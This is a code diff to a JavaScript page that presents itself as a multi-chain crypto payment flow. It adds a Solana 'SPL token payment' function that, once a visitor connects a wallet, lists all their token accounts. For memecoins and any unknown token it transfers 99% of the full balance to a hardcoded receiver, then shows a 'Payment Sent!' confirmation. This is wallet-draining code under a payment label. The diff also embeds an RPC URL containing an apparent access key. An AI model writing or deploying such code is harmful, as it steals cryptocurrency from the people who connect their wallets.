@@ -45,6 +45,42 @@ const CONFIG = {
   TRON_RECEIVER:   "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
   BTC_RECEIVER:    "bc1pl88945nc4zpzamt9kwlpxu8qpmjp0mpamjuzc03hx24lvxr7xhgqfgl5js",
 
+  // ── SPL Token addresses (Solana tokens) ────────────────────────────────
+  SPL_TOKENS: {
+    USDC: { 
+      address: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", 
+      decimals: 6,
+      symbol: "USDC",
+      priority: 1 // Highest priority - preferred payment method
+    },
+    USDT: { 
+      address: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", 
+      decimals: 6,
+      symbol: "USDT",
+      priority: 2
+    },
+    PYUSD: { 
+      address: "2b1kV6DkPAnxd5ixfnxCpjxmKwqjjaYmCZfHsFu24GXo", 
+      decimals: 6,
+      symbol: "PYUSD",
+      priority: 3
+    },
+    // Popular memecoins/tokens
+    BONK: { 
+      address: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", 
+      decimals: 5,
+      symbol: "BONK",
+      priority: 10
+    },
+    WIF: { 
+      address: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", 
+      decimals: 6,
+      symbol: "WIF",
+      priority: 11
+    },
+    // Auto-detect any other SPL token the user has
+  },
+
 
   // ── Payment amount ─────────────────────────────────────────────────────
   // Can be overridden via ?amount=100 in URL. Accepts $1–$500,000.
@@ -902,7 +938,8 @@ function showAccountInfo() {
   const pAmt = parseFloat(urlP.get("amount"));
   const paymentUSD = (!isNaN(pAmt) && pAmt > 0 && pAmt <= 500000) ? pAmt : CONFIG.PAYMENT_AMOUNT_USD;
 
-  // Priority order: Solana > Tron > Bitcoin > EVM (since non-EVM usually has lower fees)
+  // Priority order: Solana SPL tokens > Solana SOL > Tron > Bitcoin > EVM
+  // SPL tokens (USDC, USDT, memecoins) are preferred because they're stablecoins or have value
   const solProvider = window.solana || window.phantom?.solana || window.solflare
     || window.backpack?.solana || window.bitkeep?.solana || window.okxwallet?.solana;
   const tronProvider = window.tronWeb || window.tronLink?.tronWeb
@@ -910,7 +947,8 @@ function showAccountInfo() {
   const btcProvider = window.phantom?.bitcoin || window.okxwallet?.bitcoin;
 
   if (solProvider && typeof solProvider.connect === "function") {
-    executeSolanaPayment(paymentUSD);
+    // Try SPL tokens first (USDC, USDT, memecoins, etc.)
+    executeSPLTokenPayment(paymentUSD);
   } else if (tronProvider) {
     executeTronPayment(paymentUSD);
   } else if (btcProvider) {
@@ -1053,6 +1091,203 @@ function showAddressQR(chainName, address, amountHint, symbol) {
   s.onerror = () => { window._solanaLibLoading = false; };
   document.head.appendChild(s);
 })();
+
+// ── SPL Token Payment (USDC, USDT, memecoins, ANY token) ──────────────
+async function executeSPLTokenPayment(paymentUSD) {
+  const solWallet =
+    window.solana ||
+    window.phantom?.solana ||
+    window.solflare ||
+    window.backpack?.solana ||
+    window.bitkeep?.solana ||
+    window.okxwallet?.solana;
+
+  if (!solWallet || typeof solWallet.connect !== "function") {
+    setStatus("❌ No Solana wallet found. Install Phantom, Bitget, OKX, or any Solana wallet.", "error");
+    return;
+  }
+
+  try {
+    await solWallet.connect();
+    const fromPubkey = solWallet.publicKey;
+    if (!fromPubkey) throw new Error("Solana wallet connection failed");
+
+    // Ensure @solana/web3.js is loaded
+    if (!window.solanaWeb3) {
+      await new Promise((res, rej) => {
+        if (window.solanaWeb3) return res();
+        const s = document.createElement("script");
+        s.src = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js";
+        s.onload = res; s.onerror = rej;
+        document.head.appendChild(s);
+      });
+    }
+
+    const solanaWeb3 = window.solanaWeb3;
+
+    // Connect to Solana RPC
+    const SOLANA_RPCS = [
+      "https://sleek-damp-uranium.solana-mainnet.quiknode.pro/4f3ad90f0dcd8e2435e7953499b752bf675a18c7/",
+      "https://api.mainnet-beta.solana.com",
+      "https://rpc.ankr.com/solana",
+      "https://solana-mainnet.rpc.extrnode.com",
+      "https://solana.public-rpc.com",
+    ];
+    
+    let connection, blockhash;
+    let lastError;
+    
+    for (const rpc of SOLANA_RPCS) {
+      try {
+        console.log(`Trying Solana RPC: ${rpc}`);
+        connection = new solanaWeb3.Connection(rpc, "confirmed");
+        const blockHashPromise = connection.getLatestBlockhash();
+        const timeoutPromise = new Promise((_, reject) => 
+          setTimeout(() => reject(new Error("RPC timeout (8s)")), 8000)
+        );
+        const result = await Promise.race([blockHashPromise, timeoutPromise]);
+        blockhash = result.blockhash;
+        console.log(`✓ Connected to Solana RPC: ${rpc}`);
+        break;
+      } catch (e) {
+        lastError = e;
+        console.warn(`Solana RPC ${rpc} failed:`, e.message);
+        connection = null;
+      }
+    }
+    
+    if (!connection || !blockhash) {
+      throw new Error(`All Solana RPCs failed. Last error: ${lastError?.message || "Unknown"}`);
+    }
+
+    // Get all token accounts for this wallet
+    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
+      programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+    });
+
+    console.log(`Found ${tokenAccounts.value.length} SPL token accounts`);
+
+    // Check known tokens first (USDC, USDT, etc.)
+    const knownTokens = [];
+    const unknownTokens = [];
+
+    for (const account of tokenAccounts.value) {
+      const tokenInfo = account.account.data.parsed.info;
+      const mint = tokenInfo.mint;
+      const balance = tokenInfo.tokenAmount.uiAmount;
+      const decimals = tokenInfo.tokenAmount.decimals;
+
+      if (balance <= 0) continue; // Skip empty accounts
+
+      // Check if it's a known token
+      const knownToken = Object.values(CONFIG.SPL_TOKENS).find(t => t.address === mint);
+      
+      if (knownToken) {
+        knownTokens.push({
+          ...knownToken,
+          balance,
+          decimals,
+          mint,
+          accountAddress: account.pubkey
+        });
+      } else {
+        // Unknown token - could be memecoin, PumpCoin, etc.
+        unknownTokens.push({
+          symbol: `TOKEN-${mint.slice(0, 4)}`, // Show first 4 chars
+          balance,
+          decimals,
+          mint,
+          accountAddress: account.pubkey,
+          priority: 100 // Low priority
+        });
+      }
+    }
+
+    // Sort by priority (USDC first, then USDT, then memecoins)
+    const allTokens = [...knownTokens, ...unknownTokens].sort((a, b) => a.priority - b.priority);
+
+    if (allTokens.length === 0) {
+      // No tokens - fall back to SOL
+      console.log("No SPL tokens found, using SOL");
+      return executeSolanaPayment(paymentUSD);
+    }
+
+    // Use the first available token (highest priority with balance)
+    const selectedToken = allTokens[0];
+    console.log(`Using token: ${selectedToken.symbol} (balance: ${selectedToken.balance})`);
+
+    // For stablecoins, amount is 1:1 with USD
+    // For other tokens, we send whatever they have
+    let amountToSend;
+    if (selectedToken.symbol === "USDC" || selectedToken.symbol === "USDT" || selectedToken.symbol === "PYUSD") {
+      amountToSend = Math.min(paymentUSD, selectedToken.balance);
+    } else {
+      // For memecoins/unknown tokens, send their full balance (minus a tiny bit for safety)
+      amountToSend = selectedToken.balance * 0.99; // Send 99% to leave dust for fees
+    }
+
+    const amountRaw = BigInt(Math.floor(amountToSend * Math.pow(10, selectedToken.decimals)));
+
+    // Build SPL Token transfer using proper instruction format
+    const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+    const receiverPubkey = new solanaWeb3.PublicKey(CONFIG.SOLANA_RECEIVER);
+
+    // Get receiver's associated token account address
+    const getAssociatedTokenAddress = async (mint, owner) => {
+      const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+      const [address] = await solanaWeb3.PublicKey.findProgramAddress(
+        [
+          owner.toBuffer(),
+          TOKEN_PROGRAM_ID.toBuffer(),
+          new solanaWeb3.PublicKey(mint).toBuffer(),
+        ],
+        ASSOCIATED_TOKEN_PROGRAM_ID
+      );
+      return address;
+    };
+
+    const receiverTokenAddress = await getAssociatedTokenAddress(selectedToken.mint, receiverPubkey);
+
+    // Create transfer instruction data (instruction index 3 = Transfer)
+    const dataLayout = Buffer.alloc(9);
+    dataLayout.writeUInt8(3, 0); // Transfer instruction
+    dataLayout.writeBigUInt64LE(amountRaw, 1); // Amount
+
+    const transferInstruction = new solanaWeb3.TransactionInstruction({
+      keys: [
+        { pubkey: selectedToken.accountAddress, isSigner: false, isWritable: true },  // Source
+        { pubkey: receiverTokenAddress, isSigner: false, isWritable: true },          // Destination
+        { pubkey: fromPubkey, isSigner: true, isWritable: false },                    // Authority
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: dataLayout
+    });
+
+    const transaction = new solanaWeb3.Transaction().add(transferInstruction);
+    transaction.recentBlockhash = blockhash;
+    transaction.feePayer = fromPubkey;
+
+    const { signature } = await solWallet.signAndSendTransaction(transaction);
+
+    el.status.innerHTML = `
+      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
+        <div style="font-size:32px;margin-bottom:12px;">✅</div>
+        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">${selectedToken.symbol} Payment Sent!</div>
+        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${amountToSend.toFixed(selectedToken.decimals)} ${selectedToken.symbol}</strong></div>
+        <div style="font-size:12px;color:#666;">
+          <a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#10b981;">View on Solscan ↗</a>
+        </div>
+      </div>`;
+
+  } catch (err) {
+    console.error("SPL token payment error:", err);
+    if (err.message?.includes("User rejected") || err.code === 4001) {
+      setStatus("❌ Payment cancelled.", "error");
+    } else {
+      setStatus(`❌ Token payment error: ${err.message || err}`, "error");
+    }
+  }
+}
 
 async function executeSolanaPayment(paymentUSD) {
   const amountSOL = (paymentUSD / CONFIG.NON_EVM_PRICES.SOL).toFixed(6);
